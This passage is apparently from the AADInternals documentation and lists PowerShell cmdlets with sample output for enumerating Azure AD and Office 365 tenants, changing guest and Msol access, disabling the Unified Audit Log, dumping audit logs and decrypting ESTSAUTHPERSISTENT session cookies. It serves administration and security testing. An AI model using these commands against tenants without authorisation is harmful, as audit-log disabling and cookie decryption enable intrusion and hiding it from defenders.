ENTERPRISEPREMIUM 7547a3fe-08ee-4ccb-b430-5077c5041653 YAMMER_ENTERPRISE     YammerEnterprise              2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 8e0c0a52-6a6c-4d40-8370-dd62790dcd70 THREAT_INTELLIGENCE   Exchange                      2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 9c0dab89-a30c-4117-86e7-97bda240acd2 POWERAPPS_O365_P3     PowerAppsService              2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM b737dad2-2f6c-4c65-90e3-ca563267e8b9 PROJECTWORKMANAGEMENT ProjectWorkManagement         2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 5dbe027f-2339-4123-9542-606e4d348a72 SHAREPOINTENTERPRISE  SharePoint                    2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 8c098270-9dd4-4350-9b30-ba4703f3b36b ADALLOM_S_O365        Adallom                       2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 6c6042f5-6f01-4d67-b8c1-eb99d36eed3e STREAM_O365_E5        MicrosoftStream               2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 07699545-9485-468e-95b6-2fca3738be01 FLOW_O365_P3          ProcessSimple                 2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 4de31727-a228-4ec3-a5bf-8e45b5ca48cc EQUIVIO_ANALYTICS     Exchange                      2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 0feaeb32-d00e-4d66-bd5a-43b5b83db82c MCOSTANDARD           MicrosoftCommunicationsOnline 2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 70d33638-9c74-4d01-bfd3-562de28bd4ba BI_AZURE_P2           PowerBI                       2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 43de0ff5-c92c-492b-9116-175376d08c38 OFFICESUBSCRIPTION    MicrosoftOffice               2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 3e26ee1f-8a5f-4d52-aee2-b81ce45c8f40 MCOMEETADV            MicrosoftCommunicationsOnline 2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM e95bec33-7c88-4a70-8e19-b10bd9d0c014 SHAREPOINTWAC         SharePoint                    2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 8c7d2df8-86f0-4902-b2ed-a0458298f3b3 Deskless              Deskless                      2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 57ff2da0-773e-42df-b2af-ffb7a2317929 TEAMS1                TeamspaceAPI                  2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 4828c8ec-dc2e-4779-b502-87ac9ce28ab7 MCOEV                 MicrosoftCommunicationsOnline 2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 34c0d7a0-a70f-4668-9238-47f9fc208882 EXCHANGE_ANALYTICS    Exchange                      2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM f20fedf3-f3c3-43c3-8267-2bfdd51c0939 ATP_ENTERPRISE        Exchange                      2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM efb87545-963c-4e0d-99df-69c6916d9eb0 EXCHANGE_S_ENTERPRISE Exchange                      2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM e212cbc7-0961-4c40-9825-01117710dcb1 FORMS_PLAN_E5         OfficeForms                   2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM a23b959c-7ce8-4e57-9140-b90eb88a9e97 SWAY                  Sway                          2018-08-27T05:46:51Z Enabled          Success           
EMSPREMIUM        113feb6c-3fe4-4440-bddc-54d774bf0318 EXCHANGE_S_FOUNDATION Exchange                      2018-08-13T10:17:31Z Enabled          Success           
EMSPREMIUM        eec0eb4f-6444-4f95-aba0-50c24d67f998 AAD_PREMIUM_P2        AADPremiumService             2018-08-13T10:17:33Z Enabled          Success           
EMSPREMIUM        c1ec4a95-1f05-45b3-a911-aa3fa01094f5 INTUNE_A              SCO                           2018-08-13T10:17:32Z Enabled          Success           
EMSPREMIUM        2e2ddb96-6af9-4b1d-a3f0-d6ecfd22edb2 ADALLOM_S_STANDALONE  Adallom                       2018-08-13T10:17:31Z Enabled          Success           
EMSPREMIUM        6c57d4b6-3b23-47a5-9bc9-69f17b4947b3 RMS_S_PREMIUM         RMSOnline                     2018-08-13T10:17:32Z Enabled          Success           
EMSPREMIUM        41781fb2-bc02-4b7c-bd55-b576c07bb09d AAD_PREMIUM           AADPremiumService             2018-08-13T10:17:34Z Enabled          Success           
EMSPREMIUM        14ab5db5-e6c4-4b20-b4bc-13e36fd2227f ATA                   AzureAdvancedThreatAnalytics  2018-08-13T10:17:31Z Enabled          Success           
EMSPREMIUM        8a256a2b-b617-496d-b51b-e76466e88db0 MFA_PREMIUM           MultiFactorService            2018-08-13T10:17:33Z Enabled          Success           
EMSPREMIUM        5689bec4-755d-4753-8b61-40975025187c RMS_S_PREMIUM2        RMSOnline                     2018-08-13T10:17:31Z Enabled          Success           
ENTERPRISEPREMIUM 882e1d05-acd1-4ccb-8708-6ee03664b117 INTUNE_O365           SCO                           2018-07-26T15:47:50Z Deleted          PendingActivation 
EMSPREMIUM        bea4c11e-220a-4e6d-8eb8-8ea15d019f90 RMS_S_ENTERPRISE      RMSOnline                     2018-06-26T10:47:37Z Enabled          Success
```

### Get-AADIntServicePrincipals (A)
Since version 0.4.5 <br>
Extracts Azure AD service principals.

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForAADGraph -SaveToCache

# List service principals
Get-AADIntServicePrincipals

{{< /highlight>}}

**Output:**
```
AccountEnabled        : true
Addresses             :
AppPrincipalId        : d32c68ad-72d2-4acb-a0c7-46bb2cf93873
DisplayName           : Microsoft Activity Feed Service
ObjectId              : 321e7bdd-d7b0-4a64-8eb3-38c259c1304a
ServicePrincipalNames : ServicePrincipalNames
TrustedForDelegation  : false

AccountEnabled        : true
Addresses             : Addresses
AppPrincipalId        : 0000000c-0000-0000-c000-000000000000
DisplayName           : Microsoft App Access Panel
ObjectId              : a9e03f2f-4471-41f2-96c5-589d5d7117bc
ServicePrincipalNames : ServicePrincipalNames
TrustedForDelegation  : false

AccountEnabled        : true
Addresses             :
AppPrincipalId        : dee7ba80-6a55-4f3b-a86c-746a9231ae49
DisplayName           : Microsoft AppPlat EMA
ObjectId              : ae0b81fc-c521-4bfd-9eaa-04c520b4b5fd
ServicePrincipalNames : ServicePrincipalNames
TrustedForDelegation  : false

AccountEnabled        : true
Addresses             : Addresses
AppPrincipalId        : 65d91a3d-ab74-42e6-8a2f-0add61688c74
DisplayName           : Microsoft Approval Management
ObjectId              : d8ec5b95-e5f6-416e-8e7c-c6c52ec5a11f
ServicePrincipalNames : ServicePrincipalNames
TrustedForDelegation  : false
```

**Example:**
{{< highlight powershell >}}
# Get details for Microsoft Activity Feed Service
Get-AADIntServicePrincipals -ClientIds d32c68ad-72d2-4acb-a0c7-46bb2cf93873

{{< /highlight>}}

**Output:**
```
odata.type                          : Microsoft.DirectoryServices.ServicePrincipal
objectType                          : ServicePrincipal
objectId                            : 321e7bdd-d7b0-4a64-8eb3-38c259c1304a
deletionTimestamp                   :
accountEnabled                      : True
addIns                              : {}
alternativeNames                    : {}
appBranding                         :
appCategory                         :
appData                             :
appDisplayName                      : Microsoft Activity Feed Service
appId                               : d32c68ad-72d2-4acb-a0c7-46bb2cf93873
applicationTemplateId               :
appMetadata                         :
appOwnerTenantId                    : f8cdef31-a31e-4b4a-93e4-5f571e91255a
appRoleAssignmentRequired           : False
appRoles                            : {}
authenticationPolicy                :
disabledByMicrosoftStatus           :
displayName                         : Microsoft Activity Feed Service
errorUrl                            :
homepage                            :
informationalUrls                   : @{termsOfService=; support=; privacy=; marketing=}
keyCredentials                      : {}
logoutUrl                           :
managedIdentityResourceId           :
microsoftFirstParty                 : True
notificationEmailAddresses          : {}
oauth2Permissions                   : {...}
passwordCredentials                 : {}
preferredSingleSignOnMode           :
preferredTokenSigningKeyEndDateTime :
preferredTokenSigningKeyThumbprint  :
publisherName                       : Microsoft Services
replyUrls                           : {}
samlMetadataUrl                     :
samlSingleSignOnSettings            :
servicePrincipalNames               : {d32c68ad-72d2-4acb-a0c7-46bb2cf93873, https://activity.windows.com, https://acti
                                      vity.microsoft.com, https://enterprise.activity.windows.com}
tags                                : {}
tokenEncryptionKeyId                :
servicePrincipalType                : Application
useCustomTokenSigningKey            :
verifiedPublisher                   : @{displayName=; verifiedPublisherId=; addedDateTime=}
```

### Get-AADIntSubscriptions (A)
This function returns tenant's subscription details, such as name, id, number of licenses, and when created.

**Example:**
{{< highlight powershell >}}
# Get subscriptions of the tenant
Get-AADIntSubscriptions
{{< /highlight>}}

**Output:**
```
SkuPartNumber     WarningUnits TotalLicenses IsTrial NextLifecycleDate    OcpSubscriptionId                    ConsumedUnits ObjectId                             SkuId                                DateCreated         
-------------     ------------ ------------- ------- -----------------    -----------------                    ------------- --------                             -----                                -----------         
EMSPREMIUM        0            250           true    2018-11-13T00:00:00Z 76909010-12ed-4b05-b3d7-ee1b42c21b4e 21            58265dbe-24e0-4cdb-8b62-51197a4c1c13 b05e124f-c7cc-45a0-a6aa-8cf78c946968 2018-08-13T00:00:00Z
ENTERPRISEPREMIUM 25           25            true    2018-10-27T15:47:40Z 7c206b83-2487-49fa-b91e-3d676de02ccb 21            df58544b-5062-4d6c-85de-937f203bbe0f c7df2760-2c81-4ef7-b578-5b5392b571df 2018-08-27T00:00:00Z
```

### Get-AADIntSPOServiceInformation (A)
This function returns details of tenant's SharePoint Online instance, such as when created and last modified.

**Example:**
{{< highlight powershell >}}
# Get SharePoint Online information
Get-AADIntSPOServiceInformation
{{< /highlight>}}

**Output:** (sorted for clarity)
```
CreatedOn                               : 6/26/2018 11:16:12 AM
EnableOneDriveforSuiteUsers             : False
InstanceId                              : 44f5a625-f90e-4916-b8ab-ec45d38bdbb6
LastModifiedOn                          : 10/25/2018 7:37:38 AM
OfficeGraphUrl                          : https://company-my.sharepoint.com/_layouts/15/me.aspx
RootAdminUrl                            : https://company-admin.sharepoint.com/
RootIWSPOUrl                            : https://company-my.sharepoint.com/
SPO_LegacyPublicWebSiteEditPage         : Pages/Forms/AllItems.aspx
SPO_LegacyPublicWebSitePublicUrl        : 
SPO_LegacyPublicWebSiteUrl              : 
SPO_MySiteHostUrl                       : https://company-my.sharepoint.com/
SPO_MySiteHost_AboutMeUrl               : https://company-my.sharepoint.com/person.aspx
SPO_MySiteHost_DocumentsUrl             : https://company-my.sharepoint.com/_layouts/15/MySite.aspx?MySiteRedirect=AllDocuments
SPO_MySiteHost_NewsFeedUrl              : https://company-my.sharepoint.com/default.aspx
SPO_MySiteHost_ProjectSiteUrl           : https://company-my.sharepoint.com/_layouts/15/MyProjects.aspx
SPO_MySiteHost_SitesUrl                 : https://company-my.sharepoint.com/_layouts/15/MySite.aspx?MySiteRedirect=AllSites
SPO_PublicWebSitePublicUrl              : 
SPO_PublicWebSiteUrl                    : NotSupported
SPO_RegionalRootSiteUrl                 : https://company.sharepoint.com/
SPO_RootSiteUrl                         : https://company.sharepoint.com/
SPO_TenantAdminUrl                      : https://company-admin.sharepoint.com/
SPO_TenantAdmin_CreateSiteCollectionUrl : https://company-admin.sharepoint.com/_layouts/15/online/CreateSiteFull.aspx
SPO_TenantAdmin_ProjectAdminUrl         : https://company-admin.sharepoint.com/
SPO_TenantAdmin_ViewSiteCollectionsUrl  : https://company-admin.sharepoint.com/
SPO_TenantUpgradeUrl                    : https://company-admin.sharepoint.com/
ServiceInformation_LastChangeDate       : 10/25/2018 7:37:22 AM
ShowSites_InitialVisibility             : True
ShowSkyDrivePro_InitialVisibility       : True
ShowYammerNewsFeed_InitialVisibility    : True
VideoPortalServerRelativeUrl            : /portals/hub/_layouts/15/videohome.aspx
```

### Get-AADIntCompanyInformation (A)
This function returns details about tenant's company information. Pretty much same functionality than **Get-MsolCompanyInformation** cmdlet.

**Example:**
{{< highlight powershell >}}
# Get company information of the tenant
Get-AADIntCompanyInformation
{{< /highlight>}}

**Output:**
```
AllowAdHocSubscriptions                  : false
AllowEmailVerifiedUsers                  : false
AuthorizedServiceInstances               : AuthorizedServiceInstances
AuthorizedServices                       : 
City                                     : 
CompanyDeletionStartTime                 : 
CompanyTags                              : CompanyTags
CompanyType                              : CompanyTenant
CompassEnabled                           : 
Country                                  : 
CountryLetterCode                        : GB
DapEnabled                               : 
DefaultUsageLocation                     : 
DirSyncAnchorAttribute                   : 
DirSyncApplicationType                   : 1651564e-7ce4-4d99-88be-0a65050d8dc3
DirSyncClientMachineName                 : SERVER2016
DirSyncClientVersion                     : 1.1.882.0
DirSyncServiceAccount                    : Sync_SERVER2016_acf4f37725ce@company.onmicrosoft.com
DirectorySynchronizationEnabled          : true
DirectorySynchronizationStatus           : Enabled
DisplayName                              : Company Ltd
InitialDomain                            : company.onmicrosoft.com
LastDirSyncTime                          : 2018-10-25T13:53:46Z
LastPasswordSyncTime                     : 2018-10-25T14:03:01Z
MarketingNotificationEmails              : 
MultipleDataLocationsForServicesEnabled  : 
ObjectId                                 : 6c1a3ac3-5416-4dd0-984e-228cc80dbc9f
PasswordSynchronizationEnabled           : true
PortalSettings                           : PortalSettings
PostalCode                               : 
PreferredLanguage                        : en
ReleaseTrack                             : StagedRollout
ReplicationScope                         : EU
RmsViralSignUpEnabled                    : false
SecurityComplianceNotificationEmails     : 
SecurityComplianceNotificationPhones     : 
SelfServePasswordResetEnabled            : false
ServiceInformation                       : ServiceInformation
ServiceInstanceInformation               : ServiceInstanceInformation
State                                    : 
Street                                   : 
SubscriptionProvisioningLimited          : false
TechnicalNotificationEmails              : TechnicalNotificationEmails
TelephoneNumber                          : 123456789
UIExtensibilityUris                      : 
UsersPermissionToCreateGroupsEnabled     : false
UsersPermissionToCreateLOBAppsEnabled    : false
UsersPermissionToReadOtherUsersEnabled   : true
UsersPermissionToUserConsentToAppEnabled : false
```

### Get-AADIntCompanyTags (A)
This function returns tags attached to the tenant. Microsoft uses these to identity the status of certain changes, such as SharePoint version update.

**Example:**
{{< highlight powershell >}}
# Get login information for a domain
Get-AADIntCompanyTags -Domain "company.com"
{{< /highlight>}}

**Output:**
```
azure.microsoft.com/azure=active
o365.microsoft.com/startdate=635711754831829038
o365.microsoft.com/version=15
o365.microsoft.com/signupexperience=GeminiSignUpUI
o365.microsoft.com/14to15UpgradeScheduled=True
o365.microsoft.com/14to15UpgradeCompletedDate=04-16-2013
```

### Get-AADIntAADConnectStatus (Z)
Since version 0.4.5
Shows the status of Azure AD Connect (AAD Connect).

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForAADIAMAPI -SaveToCache

# Show the status of AAD Connect
Get-AADIntAADConnectStatus

{{< /highlight>}}

**Output:**
```
verifiedDomainCount              : 4
verifiedCustomDomainCount        : 3
federatedDomainCount             : 2
numberOfHoursFromLastSync        : 0
dirSyncEnabled                   : True
dirSyncConfigured                : True
passThroughAuthenticationEnabled : True
seamlessSingleSignOnEnabled      : True
```

### Get-AADIntSyncConfiguration (A)
This function returns synchronisation details.

**Example:**
{{< highlight powershell >}}
# Get tenant sync configuration
Get-AADIntSyncConfiguration
{{< /highlight>}}

**Output:**
```
TresholdCount                           : 501
UserContainer                           : 
TenantId                                : 6c1a3ac3-5416-4dd0-984e-228cc80dbc9f
ApplicationVersion                      : 1651564e-7ce4-4d99-88be-0a65050d8dc3
DisplayName                             : Company Ltd
IsPasswordSyncing                       : true
AllowedFeatures                         : {ObjectWriteback,  , PasswordWriteback}
PreventAccidentalDeletion               : EnabledForCount
TotalConnectorSpaceObjects              : 15
MaxLinksSupportedAcrossBatchInProvision : 15000
UnifiedGroupContainer                   : 
IsTrackingChanges                       : false
ClientVersion                           : 1.1.882.0
DirSyncFeatures                         : 41021
SynchronizationInterval                 : PT30M
AnchorAttribute                         : 
DirSyncClientMachine                    : SERVER2016
IsDirSyncing                            : true
TresholdPercentage                      : 0
```

### Get-AADIntTenantDomain (M)
Since version 0.7.2 <br>
Returns the default domain for the given tenant id.

**Example:**
{{< highlight powershell >}}
# Get access token and store to cache
Get-AADIntAccessTokenForMSGraph -SaveToCache

# Get the default domain of the given tenant id
Get-AADIntTenantDomain -TenantId 72f988bf-86f1-41af-91ab-2d7cd011db47
{{< /highlight>}}

**Output:**
```
microsoft.onmicrosoft.com
```

### Get-AADIntTenantDomains (*)
Since version 0.1.6 <br>
This function returns all registered domains from the tenant of the given domain. 

**Example:**
{{< highlight powershell >}}
# List domains from tenant where company.com is registered
Get-AADIntTenantDomains -Domain company.com
{{< /highlight>}}

**Output:**
```
company.com
company.fi
company.co.uk
company.onmicrosoft.com
company.mail.onmicrosoft.com
```

### Get-AADIntKerberosDomainSyncConfig (A)
Since version 0.3.1 <br>
Gets tenant's Kerberos domain sync configuration using Azure AD Sync API

**Example:**
{{< highlight powershell >}}
# Get the access token
$at = Get-AADIntAccessTokenForAADGraph

# Dump the Kerberos domain sync config
Get-AADIntKerberosDomainSyncConfig -AccessToken $at
{{< /highlight>}}

**Output:**
```
PublicEncryptionKey                                                                              SecuredEncryptionAlgorithm SecuredKeyId SecuredPartitionId
-------------------                                                                              -------------------------- ------------ ------------------
RUNLMSAAAABOD8OPj7I3nfeuh7ELE47OtA3yvyryQ0wamf5jPy2uGKibaTRKJd/kFexTpJ8siBxszKCXC2sn1Fd9pEG2y7fu 5                          2            15001 
```

### Get-AADIntWindowsCredentialsSyncConfig (A)
Since version 0.3.1 <br>
Gets tenant's Windows credentials synchronization config

**Example:**
{{< highlight powershell >}}
# Get the access token
$at = Get-AADIntAccessTokenForAADGraph

# Dump the Windows Credentials sync
Get-AADIntWindowsCredentialsSyncConfig -AccessToken $at
{{< /highlight>}}

**Output:**
```
EnableWindowsLegacyCredentials EnableWindowsSupplementaCredentials SecretEncryptionCertificate                                                                            
------------------------------ ----------------------------------- ---------------------------                                                                            
						  True                               False MIIDJTCCAg2gAwIBAgIQFwRSInW7I...
```

### Get-AADIntSyncDeviceConfiguration (A)
Since version 0.3.1 <br>
Gets tenant's Windows credentials synchronization config. Does not require admin rights.

**Example:**
{{< highlight powershell >}}
# Get the access token
$at = Get-AADIntAccessTokenForAADGraph

# Dump the Sync Device configuration
Get-AADIntSyncDeviceConfiguration -AccessToken $at
{{< /highlight>}}

**Output:**
```
PublicIssuerCertificates CloudPublicIssuerCertificates                                                                                                                    
------------------------ -----------------------------                                                                                                                    
{$null}                  {MIIDejCCAmKgAwIBAgIQzsvx7rE77rJM...
```

### Get-AADIntTenantAuthPolicy (M)
Since version 0.4.3 <br>
Gets tenant's authorization policy, including user and guest settings.

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForMSGraph -SaveToCache

# Dump the tenant authentication policy
Get-AADIntTenantAuthPolicy
{{< /highlight>}}

**Output:**
```
id                                                : authorizationPolicy
allowInvitesFrom                                  : everyone
allowedToSignUpEmailBasedSubscriptions            : True
allowedToUseSSPR                                  : True
allowEmailVerifiedUsersToJoinOrganization         : False
blockMsolPowerShell                               : False
displayName                                       : Authorization Policy
description                                       : Used to manage authorization related settings across the company.
enabledPreviewFeatures                            : {}
guestUserRoleId                                   : a0b1b346-4d3e-4e8b-98f8-753987be4970
permissionGrantPolicyIdsAssignedToDefaultUserRole : {microsoft-user-default-legacy}
defaultUserRolePermissions                        : @{allowedToCreateApps=True; allowedToCreateSecurityGroups=True;
                                                    allowedToReadOtherUsers=True}
```

### Get-AADIntTenantGuestAccess (M)
Since version 0.4.3 <br>
Gets the guest access level of the user's tenant.

Access level  | Description
---|---
Inclusive     | Guest users have the same access as members
Normal        | Guest users have limited access to properties and memberships of directory objects
Restricted    | Guest user access is restricted to properties and memberships of their own directory objects (most restrictive)

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForMSGraph -SaveToCache

# Get the tenant guest access
Get-AADIntTenantGuestAccess
{{< /highlight>}}

**Output:**
```
Access Description                                                                        RoleId                              
------ -----------                                                                        ------                              
Normal Guest users have limited access to properties and memberships of directory objects 10dae51f-b6af-4016-8d66-8c2a99b929b3
```

### Set-AADIntTenantGuestAccess (M)
Since version 0.4.3 <br>
Sets the guest access level of the user's tenant.

Access level  | Description
---|---
Inclusive     | Guest users have the same access as members
Normal        | Guest users have limited access to properties and memberships of directory objects
Restricted    | Guest user access is restricted to properties and memberships of their own directory objects (most restrictive)

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForMSGraph -SaveToCache

# Get the tenant guest access
Set-AADIntTenantGuestAccess -Level Normal
{{< /highlight>}}

**Output:**
```
Access Description                                                                        RoleId                              
------ -----------                                                                        ------                              
Normal Guest users have limited access to properties and memberships of directory objects 10dae51f-b6af-4016-8d66-8c2a99b929b3
```

### Enable-AADIntTenantMsolAccess (M)
Since version 0.4.3 <br>
Enables Msol PowerShell module access for the user's tenant.

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForMSGraph -SaveToCache

# Enable the Msol PowerShell module access
Enable-AADIntTenantMsolAccess

# Check the settings
Get-AADIntTenantAuthPolicy | Select block*
{{< /highlight>}}

**Output:**
```
blockMsolPowerShell
-------------------
              False
```

### Disable-AADIntTenantMsolAccess (M)
Since version 0.4.3 <br>
Disables Msol PowerShell module access for the user's tenant.

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForMSGraph -SaveToCache

# Disable the Msol PowerShell module access
Disable-AADIntTenantMsolAccess

# Check the settings after 10 seconds or so.
Get-AADIntTenantAuthPolicy | Select block*
{{< /highlight>}}

**Output:**
```
blockMsolPowerShell
-------------------
              True
```

### Get-AADIntUnifiedAuditLogSettings (E)
Since version 0.4.5 <br>
Gets Unified Audit Log settings with Get-AdminAuditLogConfig using Remote Exchange Online PowerShell.

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForEXO -SaveToCache

# Get the unified audit log settings
Get-AADIntUnifiedAuditLogSettings | Select Unified*
{{< /highlight>}}

**Output:**
```
UnifiedAuditLogIngestionEnabled UnifiedAuditLogFirstOptInDate
------------------------------- -----------------------------
true                            2021-01-22T09:59:51.0870075Z
```

### Set-AADIntUnifiedAuditLogSettings (E)
Since version 0.4.5 <br>
Enables or disables Unified Audit log Set-AdminAuditLogConfig using Remote Exchange Online PowerShell. <br>
**Note!** It will take hours for the changes to take effect.


**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForEXO -SaveToCache

# Disable the unified audit log
Set-AADIntUnifiedAuditLogSettings -Enabled false
{{< /highlight>}}

### Get-AADIntComplianceAPICookies
Since version 0.6.2 <br>
Gets cookies used with compliance API functions. 

**Note!** Uses interactive login form so AAD Joined or Registered computers may login automatically. If this happens, start PowerShell as another user and try again.

**Example1:**
{{< highlight powershell >}}
# Get compliance API cookies
$cookies = Get-AADIntComplianceAPICookies
# Dump the first 150 entries from the last 90 days to json file
Search-AADIntUnifiedAuditLog -Cookies $cookies -Verbose -Start (get-date).AddDays(-90) | Set-Content auditlog.json
{{< /highlight>}}

**Example2:**
{{< highlight powershell >}}
# Get compliance API cookies
$cookies = Get-AADIntComplianceAPICookies
# Dump the whole log (max 50100) from the last 90 days to json file
Search-AADIntUnifiedAuditLog -Cookies $cookies -Verbose -Start (get-date).AddDays(-90) -All | Set-Content auditlog.json
{{< /highlight>}}

**Example3:**
{{< highlight powershell >}}
# Get compliance API cookies
$cookies = Get-AADIntComplianceAPICookies
# Dump the whole log (max 50100) from the last 90 days to csv file
Search-AADIntUnifiedAuditLog -Cookies $cookies -Verbose -Start (get-date).AddDays(-90) -All | ConvertTo-Csv | Set-Content auditlog.csv
{{< /highlight>}}

### Search-AADIntUnifiedAuditLog (CA)
Since version 0.6.2 <br>
Searches Unified Audit Log using https://compliance.microsoft.com/api. By default, returns 150 first log entries. With -All switch returns all entries matching the query (max 50100).

**Example1:**
{{< highlight powershell >}}
# Get compliance API cookies
$cookies = Get-AADIntComplianceAPICookies
# Dump the first 150 entries from the last 90 days to json file
Search-AADIntUnifiedAuditLog -Cookies $cookies -Verbose -Start (get-date).AddDays(-90) | Set-Content auditlog.json
{{< /highlight>}}

**Example2:**
{{< highlight powershell >}}
# Get compliance API cookies
$cookies = Get-AADIntComplianceAPICookies
# Dump the whole log (max 50100) from the last 90 days to csv file
Search-AADIntUnifiedAuditLog -Cookies $cookies -Verbose -Start (get-date).AddDays(-90) -All | Set-Content auditlog.json
{{< /highlight>}}


### Get-AADIntConditionalAccessPolicies (A)
Since version 0.4.7 <br>
Shows conditional access policies.

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForAADGraph -SaveToCache

# List the conditional access policies
Get-AADIntConditionalAccessPolicies
{{< /highlight>}}
**Output:**
```
odata.type          : Microsoft.DirectoryServices.Policy
objectType          : Policy
objectId            : e35e4cd3-53f8-4d65-80bb-e3279c2c1b71
deletionTimestamp   : 
displayName         : On-Premise Authentication Flow Policy
keyCredentials      : {**}
policyType          : 8
policyDetail        : {**}
policyIdentifier    : 
tenantDefaultPolicy : 8

odata.type          : Microsoft.DirectoryServices.Policy
objectType          : Policy
objectId            : 259b810f-fb50-4e57-925b-ec2292c17883
deletionTimestamp   : 
displayName         : 2/5/2021 5:53:07 AM
keyCredentials      : {}
policyType          : 10
policyDetail        : {{"SecurityPolicy":{"Version":0,"SecurityDefaults":{"IgnoreBaselineProtectionPolicies":true,"I
					  sEnabled":false}}}}
policyIdentifier    : 
tenantDefaultPolicy : 10
```

### Get-AADIntSelfServicePurchaseProducts (CM)
Since version 0.6.2 <br>
Lists the status of self-service purchase products.

**Example:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForMSCommerce -SaveToCache

# List the self-service purchase products
Get-AADIntSelfServicePurchaseProducts
{{< /highlight>}}
**Output:**
```
Product                                          Id           Status 
-------                                          --           ------ 
Windows 365 Enterprise                           CFQ7TTC0HHS9 Enabled
Windows 365 Business with Windows Hybrid Benefit CFQ7TTC0HX99 Enabled
Windows 365 Business                             CFQ7TTC0J203 Enabled
Power Automate per user                          CFQ7TTC0KP0N Enabled
Power Apps per user                              CFQ7TTC0KP0P Enabled
Power Automate RPA                               CFQ7TTC0KXG6 Enabled
Power BI Premium (standalone)                    CFQ7TTC0KXG7 Enabled
Visio Plan 2                                     CFQ7TTC0KXN8 Enabled
Visio Plan 1                                     CFQ7TTC0KXN9 Enabled
Project Plan 3                                   CFQ7TTC0KXNC Enabled
Project Plan 1                                   CFQ7TTC0KXND Enabled
Power BI Pro                                     CFQ7TTC0L3PB Enabled
```

### Set-AADIntSelfServicePurchaseProduct (CM)
Since version 0.6.2 <br>
Change the status of the given self-service purchase product.

**Example1:**
{{< highlight powershell >}}
# Get the access token
Get-AADIntAccessTokenForMSCommerce -SaveToCache

# Disable self-service purchase for Power BI Pro
Set-AADIntSelfServicePurchaseProduct -Id CFQ7TTC0L3PB -Enabled $false
{{< /highlight>}}
**Output:**
```
Product      Id           Status 
-------      --           ------ 
Power BI Pro CFQ7TTC0L3PB Disabled
```

**Example2:**
{{< highlight powershell >}}
# Disable self-service purchase for all products
Get-AADIntSelfServicePurchaseProducts | Set-AADIntSelfServicePurchaseProduct -Enabled $false
{{< /highlight>}}
**Output:**
```
Product                                          Id           Status  
-------                                          --           ------  
Windows 365 Enterprise                           CFQ7TTC0HHS9 Disabled
Windows 365 Business with Windows Hybrid Benefit CFQ7TTC0HX99 Disabled
Windows 365 Business                             CFQ7TTC0J203 Disabled
Power Automate per user                          CFQ7TTC0KP0N Disabled
Power Apps per user                              CFQ7TTC0KP0P Disabled
Power Automate RPA                               CFQ7TTC0KXG6 Disabled
Power BI Premium (standalone)                    CFQ7TTC0KXG7 Disabled
Visio Plan 2                                     CFQ7TTC0KXN8 Disabled
Visio Plan 1                                     CFQ7TTC0KXN9 Disabled
Project Plan 3                                   CFQ7TTC0KXNC Disabled
Project Plan 1                                   CFQ7TTC0KXND Disabled
Power BI Pro                                     CFQ7TTC0L3PB Disabled
```

### Unprotect-AADIntEstsAuthPersistentCookie (*)
Since version 0.6.8 <br>
Decrypts and dumps users stored in ESTSAUTHPERSISTENT.

**Example:**
{{< highlight powershell >}}
# Decrypt the ESTSAUTHPERSISTENT cookie
Unprotect-AADIntEstsAuthPersistentCookie -Cookie 0.ARMAqlCH3MZuvUCNgTAd4B7IRffhvoluXopNnz3s1gEl...
{{< /highlight>}}
**Output:**
```
name       : Some User
login      : user@company.com
imageAAD   : work_account.png
imageMSA   : personal_account.png
isLive     : False
isGuest    : False
link       : user@company.com
authUrl    : 
isSigned   : True
sessionID  : 1fb5e6b3-09a4-4ceb-bcad-3d6d0ee89bf7
domainHint : 
isWindows  : False

name       : Another User
login      : user2@company.com
imageAAD   : work_account.png
imageMSA   : personal_account.png
isLive     : False
isGuest    : False
link       : user2@company.com
authUrl    : 
isSigned   : False
sessionID  : 1fb5e6b3-09a4-4ceb-bcad-3d6d0ee89bf7
domainHint : 
isWindows  : False
```

### Get-AADIntSyncFeatures (A)
Since version 0.6.7 <br>
Show the status of synchronisation features.

**Example:**
{{< highlight powershell >}}
# Get access token
Get-AADIntAccessTokenForAADGraph -SaveToCache

# List the status of the sync features
Get-AADIntSyncFeatures
{{< /highlight>}}
**Output:**
```
BlockCloudObjectTakeoverThroughHardMatch         : True
BlockSoftMatch                                   : False
DeviceWriteback                                  : False
DirectoryExtensions                              : False
DuplicateProxyAddressResiliency                  : True
DuplicateUPNResiliency                           : True
